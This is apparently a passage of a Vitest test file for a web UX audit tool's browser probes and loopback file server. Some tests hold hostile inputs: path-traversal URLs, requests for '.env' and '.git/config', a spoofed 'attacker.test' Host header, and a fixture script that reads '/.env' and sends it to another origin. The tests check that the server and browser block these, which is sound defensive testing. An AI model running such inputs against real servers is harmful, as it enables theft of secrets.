/**
 * runtime-ux-audit dynamic pass: pure helpers and the loopback server run
 * everywhere; the probes run in real Chromium and skip cleanly without it.
 */
import { mkdirSync, readFileSync, readdirSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import http from 'node:http';
import net from 'node:net';
import { join } from 'node:path';
import { pathToFileURL } from 'node:url';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { Ajv2020, addFormats } from '../helpers/plugin-deps.mjs';
import { FIXED_TS, FIXTURES_DIR, SKILL_DIR, chromiumAvailable, tempDir, withServer, writeFiles } from './helpers.mjs';
import { auditRuntimeUx } from '../../plugins/atelier/skills/runtime-ux-audit/index.mjs';
import { emptyFacts, runDynamicPass } from '../../plugins/atelier/skills/runtime-ux-audit/dynamic/index.mjs';
import { summarizeInteractions } from '../../plugins/atelier/skills/runtime-ux-audit/dynamic/inp.mjs';
import { contentTypeFor, hasHiddenSegment, startServer } from '../../plugins/atelier/skills/runtime-ux-audit/dynamic/serve.mjs';
import { LAUNCH_OPTIONS, cleanEntries, cleanLoaf, cleanSweep, errorMessage } from '../../plugins/atelier/skills/runtime-ux-audit/dynamic/probes.mjs';
import { UxAuditError } from '../../plugins/atelier/skills/runtime-ux-audit/lib/errors.mjs';
import { buildHtmlModel } from '../../plugins/atelier/skills/runtime-ux-audit/lib/html-model.mjs';
import { normalizeText } from '../../plugins/atelier/skills/runtime-ux-audit/lib/collect.mjs';
import { createPageUrls, safeRealpath } from '../../plugins/atelier/skills/runtime-ux-audit/lib/url.mjs';

const DYNAMIC_FIXTURES = join(FIXTURES_DIR, 'dynamic');
const DYNAMIC_DIR = join(SKILL_DIR, 'dynamic');

const ev = (interactionId, name, startTime, duration, processingStart = startTime, processingEnd = startTime, target = null) => ({
  interactionId, name, target, startTime, duration, processingStart, processingEnd,
});

describe('summarizeInteractions', () => {
  it('groups by interactionId and takes the longest entry as the latency', () => {
    const inp = summarizeInteractions([
      ev(1, 'pointerdown', 100, 24, 104, 110, 'button.a'),
      ev(1, 'click', 100, 96, 110, 180, 'button.a'),
      ev(2, 'keydown', 300, 40, 302, 330, '#b'),
      ev(0, 'mousemove', 400, 500),
    ], 2);
    expect(inp).toEqual({
      estimateMs: 96,
      p75InteractionMs: 96,
      maxMs: 96,
      count: 2,
      belowThreshold: false,
      worst: { name: 'click', target: 'button.a', inputDelayMs: 10, processingMs: 70, presentationMs: 16 },
    });
  });

  it('skips one outlier per 50 interactions (interactionCount 120 picks index 2)', () => {
    const entries = [];
    for (let i = 1; i <= 10; i++) entries.push(ev(i, 'click', i * 1000, i * 10));
    const inp = summarizeInteractions(entries, 120);
    expect(inp.maxMs).toBe(100);
    expect(inp.estimateMs).toBe(80);
    // Without a count the group count (10) is used: floor(10 / 50) = 0.
    expect(summarizeInteractions(entries, null).estimateMs).toBe(100);
    // The index never runs past the last group.
    expect(summarizeInteractions(entries.slice(0, 2), 5000).estimateMs).toBe(10);
  });

  it('uses the nearest-rank p75', () => {
    const entries = [10, 20, 30, 40].map((d, i) => ev(i + 1, 'click', i * 100, d));
    expect(summarizeInteractions(entries).p75InteractionMs).toBe(30);
    expect(summarizeInteractions(entries.slice(0, 1)).p75InteractionMs).toBe(10);
    const five = [16, 24, 32, 48, 200].map((d, i) => ev(i + 1, 'click', i * 100, d));
    expect(summarizeInteractions(five).p75InteractionMs).toBe(48);
  });

  it('returns nulls for no entries, with belowThreshold only when interactions happened', () => {
    const empty = { estimateMs: null, p75InteractionMs: null, maxMs: null, count: 0, worst: null };
    expect(summarizeInteractions([])).toEqual({ ...empty, belowThreshold: false });
    expect(summarizeInteractions(undefined, null, { attempted: 0 })).toEqual({ ...empty, belowThreshold: false });
    expect(summarizeInteractions([], null, { attempted: 3 })).toEqual({ ...empty, belowThreshold: true });
    expect(summarizeInteractions([], 4)).toEqual({ ...empty, belowThreshold: true });
  });

  it('ignores malformed entries, breaks ties by id and rounds to integers', () => {
    const inp = summarizeInteractions([
      null, 'x', { interactionId: 'a', duration: 10 }, { interactionId: 5, duration: Number.NaN },
      ev(9, 'click', 10.4, 40.4, 12.2, 30.7, '#late'),
      ev(3, 'keydown', 0.2, 40.4, 1.1, 20.6, '#early'),
    ]);
    expect(inp.count).toBe(2);
    expect(inp.worst.target).toBe('#early');
    expect(inp.estimateMs).toBe(40);
    for (const v of Object.values(inp.worst)) if (typeof v === 'number') expect(Number.isInteger(v)).toBe(true);
  });

  it('never reports negative sub-parts', () => {
    // Event Timing rounds duration to 8 ms, so start + duration can land before processingEnd.
    const inp = summarizeInteractions([ev(1, 'click', 100, 16, 90, 120)]);
    expect(inp.worst).toMatchObject({ inputDelayMs: 0, processingMs: 30, presentationMs: 0 });
    const partial = summarizeInteractions([{ interactionId: 2, name: 'tap', duration: 20, startTime: 5 }]);
    expect(partial.worst).toMatchObject({ name: 'tap', target: null, inputDelayMs: 0, processingMs: 0, presentationMs: 0 });
  });
});

/** Send a raw HTTP/1.1 request so the path reaches the server unnormalized. */
function rawRequest(port, path, { method = 'GET', host = `127.0.0.1:${port}` } = {}) {
  return new Promise((resolve, reject) => {
    const sock = net.connect(port, '127.0.0.1', () => {
      sock.write(`${method} ${path} HTTP/1.1\r\nHost: ${host}\r\nConnection: close\r\n\r\n`);
    });
    let data = '';
    sock.setEncoding('latin1');
    sock.on('data', (d) => { data += d; });
    sock.on('end', () => {
      const [head, ...rest] = data.split('\r\n\r\n');
      resolve({ status: Number(head.split(' ')[1]), head: head.toLowerCase(), body: rest.join('\r\n\r\n') });
    });
    sock.on('error', reject);
  });
}

describe('loopback server (serve.mjs)', () => {
  let tmp;
  let server;
  let linked = false;

  beforeAll(async () => {
    tmp = tempDir('ux-serve-');
    const site = join(tmp.dir, 'site');
    writeFiles(site, {
      'index.html': '<!doctype html><p>hi</p>',
      'css/site.css': 'p{color:red}',
      'js/app.mjs': 'export const x = 1;',
      'dir with space/caf\u00e9.js': 'var y = 2;',
      'data.bin': Buffer.from([1, 2, 3]),
      'sub/index.html': '<p>sub</p>',
      '.env': 'TOKEN=secret-env',
      '.git/config': 'url = https://token@example.com/repo.git',
      '.well-known/x.json': '{"ok":true}',
      'sub/.hidden/y.txt': 'hidden',
    });
    writeFileSync(join(tmp.dir, 'secret.txt'), 'top secret');
    mkdirSync(join(tmp.dir, 'outside'));
    writeFileSync(join(tmp.dir, 'outside', 'leak.txt'), 'leaked');
    try {
      symlinkSync(join(tmp.dir, 'outside'), join(site, 'link'), 'junction');
      // A plainly named link into a dot folder.
      symlinkSync(join(site, '.git'), join(site, 'gitlink'), 'junction');
      linked = true;
    } catch {
      linked = false;
    }
    server = await startServer(site);
  });

  afterAll(async () => {
    await server?.close();
    tmp?.cleanup();
  });

  it('serves files with a content type and no cache headers', async () => {
    const res = await fetch(`${server.origin}/css/site.css`);
    expect(res.status).toBe(200);
    expect(res.headers.get('content-type')).toBe('text/css; charset=utf-8');
    expect(res.headers.get('cache-control')).toBeNull();
    expect(await res.text()).toBe('p{color:red}');
    const mod = await fetch(`${server.origin}/js/app.mjs?v=2#x`);
    expect(mod.headers.get('content-type')).toBe('text/javascript; charset=utf-8');
    const bin = await fetch(`${server.origin}/data.bin`);
    expect(bin.headers.get('content-type')).toBe('application/octet-stream');
    expect(Buffer.from(await bin.arrayBuffer())).toEqual(Buffer.from([1, 2, 3]));
  });

  it('answers HEAD with headers only and refuses other methods', async () => {
    const head = await rawRequest(server.port, '/index.html', { method: 'HEAD' });
    expect(head.status).toBe(200);
    expect(head.head).toContain('content-length: 24');
    expect(head.body).toBe('');
    const post = await rawRequest(server.port, '/index.html', { method: 'POST' });
    expect(post.status).toBe(405);
    expect(post.head).toContain('allow: get, head');
  });

  it('returns 404 for missing files and directories (no listing)', async () => {
    expect((await fetch(`${server.origin}/nope.html`)).status).toBe(404);
    expect((await fetch(`${server.origin}/`)).status).toBe(404);
    expect((await fetch(`${server.origin}/sub/`)).status).toBe(404);
    expect((await fetch(`${server.origin}/sub/index.html`)).status).toBe(200);
  });

  it('never serves anything outside the root', async () => {
    for (const path of ['/../secret.txt', '/..%2fsecret.txt', '/..%2F..%2Fsecret.txt', '/..%5csecret.txt', '/%2e%2e/secret.txt', '/css/..%2f..%2fsecret.txt']) {
      const res = await rawRequest(server.port, path);
      expect(res.status, path).toBe(404);
      expect(res.body, path).not.toContain('top secret');
    }
    expect((await rawRequest(server.port, '/index.html%00.txt')).status).toBe(400);
    expect((await rawRequest(server.port, '/%E0%A4%A')).status).toBe(400);
  });

  it('refuses a link that escapes the root', async (ctx) => {
    // A directory junction on Windows, a directory symlink elsewhere.
    if (!linked) ctx.skip();
    const res = await rawRequest(server.port, '/link/leak.txt');
    expect(res.status).toBe(404);
    expect(res.body).not.toContain('leaked');
  });

  it('never serves dot-named files or folders, except .well-known', async () => {
    for (const path of ['/.env', '/%2eenv', '/.git/config', '/%2Egit/config', '/sub/.hidden/y.txt', '/sub/..%2f.env', '/sub%5C..%5C.env', '/a%5C.env']) {
      const res = await rawRequest(server.port, path);
      expect(res.status, path).toBe(404);
      expect(res.body, path).not.toMatch(/secret-env|token@|hidden/);
    }
    const ok = await fetch(`${server.origin}/.well-known/x.json`);
    expect(ok.status).toBe(200);
    expect(await ok.json()).toEqual({ ok: true });
    expect(hasHiddenSegment('a/.env')).toBe(true);
    expect(hasHiddenSegment('a\\.git\\config')).toBe(true);
    expect(hasHiddenSegment('.well-known/x')).toBe(false);
    expect(hasHiddenSegment('css/site.css')).toBe(false);
  });

  it('refuses a plainly named link into a dot folder', async (ctx) => {
    if (!linked) ctx.skip();
    const res = await rawRequest(server.port, '/gitlink/config');
    expect(res.status).toBe(404);
    expect(res.body).not.toContain('token@');
  });

  it('only answers requests addressed to its own host', async () => {
    const res = await rawRequest(server.port, '/index.html', { host: 'attacker.test' });
    expect(res.status).toBe(403);
    const status = await new Promise((resolve, reject) => {
      http.get({ host: '127.0.0.1', port: server.port, path: '/index.html', headers: { host: `localhost:${server.port}` } }, (r) => {
        r.resume();
        resolve(r.statusCode);
      }).on('error', reject);
    });
    expect(status).toBe(403);
  });

  it('maps files to served URLs and back', async () => {
    const file = join(server.root, 'dir with space', 'caf\u00e9.js');
    const url = server.urlFor(file);
    expect(url).toBe(`${server.origin}/dir%20with%20space/caf%C3%A9.js`);
    expect(await (await fetch(url)).text()).toBe('var y = 2;');
    expect(server.toFileUrl(`${url}?v=1#top`)).toBe(pathToFileURL(file).href);
    expect(server.toFileUrl('https://example.com/x.js')).toBeNull();
    expect(server.toFileUrl('not a url')).toBeNull();
    expect(server.toFileUrl(`${server.origin}/%E0%A4%A`)).toBeNull();
    expect(server.toFileUrl(`${server.origin}/..%2fsecret.txt`)).toBeNull();
  });

  it('knows common content types and rejects a missing root', async () => {
    expect(contentTypeFor('a.HTML')).toBe('text/html; charset=utf-8');
    expect(contentTypeFor('x.webmanifest')).toBe('application/manifest+json; charset=utf-8');
    expect(contentTypeFor('font.woff2')).toBe('font/woff2');
    expect(contentTypeFor('noext')).toBe('application/octet-stream');
    await expect(startServer(join(tmp.dir, 'missing-root'))).rejects.toThrow(/Root directory not found/);
  });
});

describe('fact sanitizers', () => {
  it('cleanSweep keeps the contract shape and drops hostile values', () => {
    const long = 'x'.repeat(5000);
    const out = cleanSweep({
      interactive: [
        { selector: '#a', tag: 'button', role: null, type: 'submit', text: 'Buy now', rect: { x: 1.234, y: 2, width: 11.999, height: 12 }, visible: true, disabled: false, inlineInText: false },
        { selector: long, tag: 7, role: 'button', type: {}, text: long, rect: null, visible: 'yes', disabled: 1, inlineInText: true },
        'junk',
        { selector: '#c' },
      ],
      interactiveTruncated: false,
      repeatedGroups: [{ parentSelector: '#feed', signature: 'li.item', count: 40.4, belowFoldCount: -3, contentVisibility: 'auto' }, null],
      viewTransitionNames: [{ name: 'hero', selectors: ['a', 'b', 3, 'c', 'd', 'e', 'f'] }],
    }, 2);
    expect(out.interactive).toHaveLength(2);
    expect(out.interactive[0]).toEqual({ selector: '#a', tag: 'button', role: null, type: 'submit', text: 'Buy now', rect: { x: 1.23, y: 2, width: 12, height: 12 }, visible: true, disabled: false, inlineInText: false });
    expect(out.interactive[1]).toMatchObject({ tag: '', role: 'button', type: null, rect: { x: 0, y: 0, width: 0, height: 0 }, visible: false, disabled: false, inlineInText: true });
    expect(out.interactive[1].selector.length).toBe(1000);
    expect(out.interactive[1].text.length).toBe(60);
    expect(out.interactiveTruncated).toBe(true);
    expect(out.repeatedGroups).toEqual([{ parentSelector: '#feed', signature: 'li.item', count: 40, belowFoldCount: 0, contentVisibility: false }]);
    expect(out.viewTransitionNames).toEqual([{ name: 'hero', selectors: ['a', 'b', 'c', 'd', 'e'] }]);
    expect(cleanSweep({}, 10)).toEqual({ interactive: [], interactiveTruncated: false, repeatedGroups: [], viewTransitionNames: [] });
    expect(() => cleanSweep(null)).toThrow(/no data/);
  });

  it('cleanEntries validates numbers and caps the list', () => {
    const out = cleanEntries([
      ev(1, 'click', 10.5, 40, 12, 30, '#a'),
      { interactionId: 0, startTime: 1, duration: 20 },
      { interactionId: 2, startTime: 'x', duration: 20 },
      { interactionId: 3, startTime: 1, duration: 20, name: 5, target: 9 },
      [],
    ]);
    expect(out).toEqual([
      ev(1, 'click', 10.5, 40, 12, 30, '#a'),
      { interactionId: 3, name: '', target: null, startTime: 1, duration: 20, processingStart: 1, processingEnd: 1 },
    ]);
    expect(cleanEntries(Array.from({ length: 10 }, (_, i) => ev(i + 1, 'click', i, 20)), 4)).toHaveLength(4);
    expect(cleanEntries('nope')).toEqual([]);
  });

  it('cleanLoaf maps script URLs to display strings and rounds', () => {
    const display = (u) => u.replace('http://127.0.0.1:9/', '');
    const scrub = (s) => s.split('http://127.0.0.1:9/').join('');
    const out = cleanLoaf([
      {
        startTime: 1200.6, duration: 180.2, blockingDuration: 130.4,
        scripts: [
          { invoker: 'BUTTON#buy.onclick', invokerType: 'event-listener', sourceURL: 'http://127.0.0.1:9/js/slow.js', sourceFunctionName: 'onBuy', sourceCharPosition: 73, duration: 152.4, forcedStyleAndLayoutDuration: 0 },
          { invoker: 'http://127.0.0.1:9/js/boot.js', invokerType: 'classic-script', sourceURL: '', duration: 101 },
          { invoker: 'Promise.then at http://127.0.0.1:9/js/a.js', sourceURL: null },
        ],
      },
      { startTime: 'bad' },
      7,
    ], display, scrub);
    expect(out).toEqual([{
      startTime: 1201, durationMs: 180, blockingDurationMs: 130,
      scripts: [
        { invoker: 'BUTTON#buy.onclick', invokerType: 'event-listener', sourceURL: 'js/slow.js', sourceFunctionName: 'onBuy', sourceCharPosition: 73, durationMs: 152, forcedStyleAndLayoutDurationMs: 0 },
        { invoker: 'js/boot.js', invokerType: 'classic-script', sourceURL: '', sourceFunctionName: '', sourceCharPosition: -1, durationMs: 101, forcedStyleAndLayoutDurationMs: 0 },
        { invoker: 'Promise.then at js/a.js', invokerType: '', sourceURL: '', sourceFunctionName: '', sourceCharPosition: -1, durationMs: 0, forcedStyleAndLayoutDurationMs: 0 },
      ],
    }]);
  });

  it('errorMessage keeps one clean line', () => {
    expect(errorMessage(new Error('page.goto: net::ERR_FAILED at http://127.0.0.1:9/index.html\nCall log:\n  - navigating'), (s) => s.split('http://127.0.0.1:9/').join('')))
      .toBe('page.goto: net::ERR_FAILED at index.html');
    expect(errorMessage('\u001b[2mdim\u001b[22m   text')).toBe('dim text');
    expect(errorMessage(new Error(''))).toBe('unknown error');
    expect(errorMessage(`${'y'.repeat(400)}`)).toHaveLength(300);
  });
});

describe('runDynamicPass without a browser', () => {
  it('returns all-null facts from emptyFacts()', () => {
    expect(emptyFacts()).toEqual({ engine: null, profile: null, navigation: null, rendered: null, sweep: null, interactions: null, dialogs: null, bfcache: null, errors: [] });
  });

  it('rejects inputs it cannot load', async () => {
    await expect(runDynamicPass({ page: { kind: 'http', url: 'ftp://x.test/' } })).rejects.toThrow(TypeError);
    await expect(runDynamicPass({ page: { kind: 'file', url: 'file:///x.html', filePath: null, root: null } })).rejects.toThrow(/filePath and page.root/);
  });

  it('passes a launch failure through (the friendly Chromium error)', async () => {
    const { dir, cleanup } = tempDir('ux-dyn-');
    try {
      writeFiles(dir, { 'index.html': '<p>x</p>' });
      const root = safeRealpath(dir);
      const missing = new UxAuditError('CHROMIUM_MISSING', "runtime-ux-audit --dynamic needs Playwright's Chromium.", { hint: 'npx playwright install chromium' });
      let seen = null;
      const launch = async (opts) => {
        seen = opts;
        throw missing;
      };
      await expect(runDynamicPass({ page: { kind: 'file', url: '', filePath: join(root, 'index.html'), root }, launch })).rejects.toBe(missing);
      expect(seen).toEqual({ channel: 'chromium', ignoreDefaultArgs: ['--disable-back-forward-cache'] });
      expect(LAUNCH_OPTIONS.channel).toBe('chromium');
    } finally {
      cleanup();
    }
  });

  it('closes the browser when setup fails', async () => {
    let closed = 0;
    const browser = {
      version: () => '0',
      newContext: async () => { throw new Error('context refused'); },
      close: async () => { closed++; },
    };
    await expect(runDynamicPass({ page: { kind: 'http', url: 'http://127.0.0.1:9/' }, launch: async () => browser })).rejects.toThrow('context refused');
    expect(closed).toBe(1);
  });

  it('resolves with a timeout error when the deadline beats the launch, and still closes the browser', async () => {
    let closed = 0;
    const browser = {
      version: () => '0',
      newContext: async () => { throw new Error('closed'); },
      close: async () => { closed++; },
    };
    const launch = () => new Promise((resolve) => { setTimeout(() => resolve(browser), 150); });
    const facts = await runDynamicPass({ page: { kind: 'http', url: 'http://127.0.0.1:9/' }, launch, limits: { dynamicTimeoutMs: 10 } });
    expect(facts.engine).toBeNull();
    expect(facts.errors).toEqual([{ probe: 'timeout', message: 'the dynamic pass reached its 10 ms limit; the remaining probes did not run' }]);
    expect(closed).toBe(1);
  });
});

describe('browser init scripts', () => {
  const files = readdirSync(join(DYNAMIC_DIR, 'browser')).filter((f) => f.endsWith('.js'));

  it('never register unload, beforeunload or pagehide handlers (they would skew the bfcache probe)', () => {
    expect(files.sort()).toEqual(['observers.js', 'sweep.js']);
    for (const f of files) {
      const src = readFileSync(join(DYNAMIC_DIR, 'browser', f), 'utf8');
      expect(src, f).not.toMatch(/addEventListener\(\s*['"`](unload|beforeunload|pagehide)/);
      expect(src, f).not.toMatch(/\bon(unload|beforeunload|pagehide)\s*=/);
    }
  });
});

// ---- real Chromium ----

function fileInput(rel) {
  const root = safeRealpath(DYNAMIC_FIXTURES);
  const filePath = join(root, rel);
  const docUrl = pathToFileURL(filePath).href;
  const urls = createPageUrls({ kind: 'file', docUrl, root });
  return { page: { kind: 'file', url: docUrl, filePath, root }, toDisplay: (u) => urls.toDisplay(u) };
}

describe.skipIf(!chromiumAvailable)('dynamic pass in Chromium', () => {
  let facts;
  let model;

  beforeAll(async () => {
    facts = await runDynamicPass({ ...fileInput('index.html'), limits: { maxDialogTriggers: 3 } });
    if (typeof facts.rendered?.html === 'string') {
      model = buildHtmlModel(normalizeText(facts.rendered.html), { source: 'rendered', displayPath: '(rendered DOM)' });
    }
  }, 120_000);

  it('records engine, profile and navigation with display URLs', () => {
    expect(facts.errors).toEqual([]);
    expect(facts.engine).toMatchObject({ name: 'chromium', headless: 'new' });
    expect(facts.engine.version).toMatch(/^\d+\./);
    expect(facts.profile).toEqual({ device: 'Pixel 7', viewport: { width: 412, height: 839 }, deviceScaleFactor: 2.625, cpuThrottle: 4 });
    expect(facts.navigation).toEqual({ status: 200, finalUrl: 'index.html' });
  });

  it('captures the rendered DOM without the loopback origin', () => {
    expect(facts.rendered.html).toContain('id="feed"');
    expect(facts.rendered.html).not.toContain('127.0.0.1');
  });

  it('sweeps interactive targets with document rects', () => {
    const byId = Object.fromEntries(facts.sweep.interactive.map((t) => [t.selector, t]));
    expect(byId['#menu']).toMatchObject({ tag: 'button', type: 'submit', text: 'Menu', visible: true, disabled: false, inlineInText: false });
    expect(byId['#menu'].rect.width).toBeLessThan(24);
    expect(byId['#menu'].rect.height).toBeLessThan(24);
    expect(byId['#buy'].rect.width).toBeGreaterThan(24);
    const link = facts.sweep.interactive.find((t) => t.tag === 'a');
    expect(link).toMatchObject({ text: 'terms', visible: true, inlineInText: true });
    expect(byId['#custom-close']).toMatchObject({ visible: false });
    expect(facts.sweep.interactiveTruncated).toBe(false);
  });

  it('finds repeated groups and duplicated view-transition names', () => {
    expect(facts.sweep.repeatedGroups).toEqual([{ parentSelector: '#feed', signature: 'li.item', count: 40, belowFoldCount: expect.any(Number), contentVisibility: false }]);
    expect(facts.sweep.repeatedGroups[0].belowFoldCount).toBeGreaterThanOrEqual(20);
    expect(facts.sweep.viewTransitionNames).toEqual([{ name: 'hero', selectors: ['body > div.card:nth-of-type(1)', 'body > div.card:nth-of-type(2)'] }]);
  });

  it('builds selectors that core resolves to the same element (cssPath parity)', () => {
    const selectors = [
      ...facts.sweep.interactive.map((t) => t.selector),
      ...facts.sweep.repeatedGroups.map((g) => g.parentSelector),
      ...facts.sweep.viewTransitionNames.flatMap((v) => v.selectors),
      ...facts.dialogs.map((d) => d.trigger),
      ...facts.interactions.entries.map((e) => e.target).filter(Boolean),
    ];
    expect(selectors.length).toBeGreaterThan(10);
    for (const sel of new Set(selectors)) {
      const found = model.querySelectorAll(sel);
      expect(found, sel).toHaveLength(1);
      expect(model.cssPath(found[0]), sel).toBe(sel);
    }
  });

  it('measures a 150 ms click handler as INP and attributes it with LoAF', () => {
    const { interactions } = facts;
    expect(interactions.attempted.filter((a) => a.kind === 'key')).toHaveLength(12);
    // Safe candidates in DOM order; hidden close buttons and the in-text link are never tapped.
    const order = ['#menu', '#buy', '#open-custom', '#open-native'];
    const taps = interactions.attempted.filter((a) => a.kind !== 'key').map((a) => a.target);
    expect(taps).toContain('#buy');
    expect(taps.every((t) => order.includes(t))).toBe(true);
    expect(taps).toEqual([...taps].sort((a, b) => order.indexOf(a) - order.indexOf(b)));
    expect(interactions.interactionCount).toBeGreaterThanOrEqual(interactions.inp.count);
    expect(interactions.inp.estimateMs).toBeGreaterThanOrEqual(100);
    expect(interactions.inp.maxMs).toBeGreaterThanOrEqual(interactions.inp.estimateMs);
    expect(interactions.entries.some((e) => e.target === '#buy' && e.duration >= 100)).toBe(true);
    for (const e of interactions.entries) expect(Number.isInteger(e.duration)).toBe(true);
    const scripts = interactions.loaf.flatMap((f) => f.scripts);
    const slow = scripts.find((s) => s.sourceURL === 'js/slow.js' && s.durationMs >= 100);
    expect(slow).toMatchObject({ sourceFunctionName: 'onBuy', invokerType: 'event-listener' });
    expect(slow.sourceCharPosition).toBeGreaterThanOrEqual(0);
  });

  it('opens each dialog by keyboard and records where focus lands on close', () => {
    expect(facts.dialogs).toEqual([
      { trigger: '#open-custom', opened: true, closed: true, closeMethod: 'escape', activeAfterClose: 'body', restoredToTrigger: false },
      { trigger: '#open-native', opened: true, closed: true, closeMethod: 'escape', activeAfterClose: '#open-native', restoredToTrigger: true },
    ]);
  });

  it('sees a clean page restored from the back/forward cache', () => {
    expect(facts.bfcache).toEqual({ supported: true, restored: true, reasons: [] });
  });

  it('produces facts core can report and the raw schema accepts', async () => {
    const res = await auditRuntimeUx({
      url: join(DYNAMIC_FIXTURES, 'index.html'), dynamic: true, dynamicImpl: async () => facts, write: false, brand: null, timestamp: FIXED_TS,
    });
    expect(res.metrics.inpP75Ms).toBe(facts.interactions.inp.estimateMs);
    expect(res.metrics.bfcache).toEqual({ restored: true, reasons: [] });
    expect(res.markdown).toMatch(/Mode: static \+ dynamic \(Chromium \d+, Pixel 7, 4x CPU\)/);
    const schema = JSON.parse(readFileSync(join(SKILL_DIR, '..', '..', 'schemas', 'ux-audit.schema.json'), 'utf8'));
    const ajv = new Ajv2020({ strict: false, allErrors: true });
    addFormats(ajv);
    const validate = ajv.compile(schema);
    expect(validate(res.raw), JSON.stringify(validate.errors)).toBe(true);
  });

  it('reports an unload listener as not restored, over http with response headers', async () => {
    const html = readFileSync(join(DYNAMIC_FIXTURES, 'unload', 'index.html'));
    await withServer((req, res) => {
      if (req.url === '/page') {
        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'X-Probe': 'yes' });
        res.end(html);
      } else {
        res.writeHead(404);
        res.end();
      }
    }, async (base) => {
      const urls = createPageUrls({ kind: 'http', docUrl: `${base}/page`, origin: base });
      const out = await runDynamicPass({
        page: { kind: 'http', url: `${base}/page`, filePath: null, root: null },
        toDisplay: (u) => urls.toDisplay(u),
        limits: { settleMs: 100, maxTabs: 2 },
      });
      expect(out.errors).toEqual([]);
      expect(out.navigation).toMatchObject({ status: 200, finalUrl: '/page' });
      expect(out.navigation.headers['x-probe']).toBe('yes');
      expect(out.bfcache.restored).toBe(false);
      expect(out.bfcache.supported).toBe(true);
      expect(out.bfcache.reasons.length).toBeGreaterThan(0);
      expect(out.dialogs).toEqual([]);
    });
  }, 120_000);

  it('stops at a tiny dynamicTimeoutMs and reports it', async () => {
    const out = await runDynamicPass({ ...fileInput('index.html'), limits: { dynamicTimeoutMs: 1 } });
    expect(out.errors.map((e) => e.probe)).toContain('timeout');
    expect(out.bfcache).toBeNull();
  }, 120_000);

  it('records navigated-away and recovers when a tap leaves the page', async () => {
    const { dir, cleanup } = tempDir('ux-dyn-nav-');
    try {
      writeFiles(dir, {
        'index.html': '<!doctype html><meta name="viewport" content="width=device-width"><button id="go">Go</button><button id="after">After</button>'
          + '<script>document.getElementById("go").addEventListener("click", () => { location.href = "next.html"; });</script>',
        'next.html': '<!doctype html><p>next</p>',
      });
      const root = safeRealpath(dir);
      const filePath = join(root, 'index.html');
      const urls = createPageUrls({ kind: 'file', docUrl: pathToFileURL(filePath).href, root });
      const out = await runDynamicPass({
        page: { kind: 'file', url: pathToFileURL(filePath).href, filePath, root },
        toDisplay: (u) => urls.toDisplay(u),
        limits: { settleMs: 100, maxTabs: 1, maxDialogTriggers: 1 },
      });
      const nav = out.errors.filter((e) => e.probe === 'interactions');
      expect(nav).toHaveLength(1);
      expect(nav[0].message).toMatch(/^navigated-away: tapping #go left the page/);
      expect(out.interactions.attempted.map((a) => a.target)).toEqual(['body', '#go']);
      expect(out.bfcache).not.toBeNull();
      expect(JSON.stringify(out)).not.toContain('127.0.0.1');
    } finally {
      cleanup();
    }
  }, 120_000);

  it('never taps or opens a button that would submit a form', async () => {
    const PAGE = '<!doctype html><meta name="viewport" content="width=device-width">'
      + '<form method="post"><input type="hidden" name="action" value="delete-account"><button id="del">Delete my account</button></form>'
      + '<form method="post"><button id="menu" aria-haspopup="dialog">Options</button></form>'
      + '<form method="get"><input type="submit" id="search" value="Search"></form>'
      + '<button id="safe" type="button">Safe</button>'
      + '<dialog open><form method="dialog"><button id="close">Close</button></form></dialog>';
    const requests = [];
    await withServer((req, res) => {
      requests.push(`${req.method} ${req.url}`);
      req.resume();
      res.writeHead(200, { 'content-type': 'text/html' });
      res.end(req.method === 'GET' && req.url === '/' ? PAGE : '<p>done</p>');
    }, async (base) => {
      const out = await runDynamicPass({ page: { kind: 'http', url: `${base}/`, filePath: null, root: null }, limits: { settleMs: 100, maxTabs: 1, maxDialogTriggers: 3 } });
      expect(requests.filter((r) => !r.startsWith('GET /'))).toEqual([]);
      expect(requests.filter((r) => r.includes('?'))).toEqual([]);
      expect(out.errors.filter((e) => /navigated-away/.test(e.message))).toEqual([]);
      const tapped = out.interactions.attempted.map((a) => a.target);
      expect(tapped).toEqual(expect.arrayContaining(['#safe', '#close']));
      for (const id of ['#del', '#menu', '#search']) expect(tapped).not.toContain(id);
      expect(JSON.stringify(out.dialogs ?? [])).not.toContain('#menu');
    });
  }, 120_000);

  it('blocks a local page from reaching other origins unless they are allowed', async () => {
    const hits = [];
    await withServer((req, res) => {
      hits.push(req.url);
      res.writeHead(204);
      res.end();
    }, async (other) => {
      const { dir, cleanup } = tempDir('ux-dyn-egress-');
      try {
        writeFiles(dir, {
          'index.html': '<!doctype html><meta name="viewport" content="width=device-width"><p>x</p><script>'
            + `fetch('/.env').then((r) => { new Image().src = '${other}/leak?env=' + r.status; });`
            + `fetch('${other}/fetch').catch(() => {});</script>`,
          '.env': 'TOKEN=secret',
        });
        const root = safeRealpath(dir);
        const filePath = join(root, 'index.html');
        const input = { page: { kind: 'file', url: pathToFileURL(filePath).href, filePath, root }, limits: { settleMs: 100, maxTabs: 1, maxTaps: 1, maxDialogTriggers: 1 } };
        const blocked = await runDynamicPass(input);
        expect(hits).toEqual([]);
        const net = blocked.errors.filter((e) => e.probe === 'network');
        expect(net).toHaveLength(1);
        expect(net[0].message).toContain(other);
        const allowed = await runDynamicPass({ ...input, allowOrigins: [other] });
        // The dotfile itself is still refused by the loopback server.
        expect(hits).toEqual(expect.arrayContaining(['/fetch', '/leak?env=404']));
        expect(allowed.errors.filter((e) => e.probe === 'network')).toEqual([]);
      } finally {
        cleanup();
      }
    });
  }, 180_000);

  it('records a failed navigation and skips the page probes', async () => {
    const port = await new Promise((resolve) => {
      const srv = net.createServer();
      srv.listen(0, '127.0.0.1', () => {
        const p = srv.address().port;
        srv.close(() => resolve(p));
      });
    });
    const out = await runDynamicPass({ page: { kind: 'http', url: `http://127.0.0.1:${port}/`, filePath: null, root: null }, limits: { navigationTimeoutMs: 10_000 } });
    expect(out.errors).toHaveLength(1);
    expect(out.errors[0].probe).toBe('navigate');
    expect(out.errors[0].message).toMatch(/ERR_CONNECTION_REFUSED/);
    expect(out.engine).not.toBeNull();
    expect(out.navigation).toBeNull();
    expect(out.rendered).toBeNull();
    expect(out.sweep).toBeNull();
    expect(out.bfcache).toBeNull();
  }, 120_000);

  it('serves a missing local document as a 404 navigation, not an error', async () => {
    const { dir, cleanup } = tempDir('ux-dyn-gone-');
    try {
      writeFiles(dir, { 'index.html': '<p>x</p>' });
      const root = safeRealpath(dir);
      const filePath = join(root, 'index.html');
      rmSync(filePath);
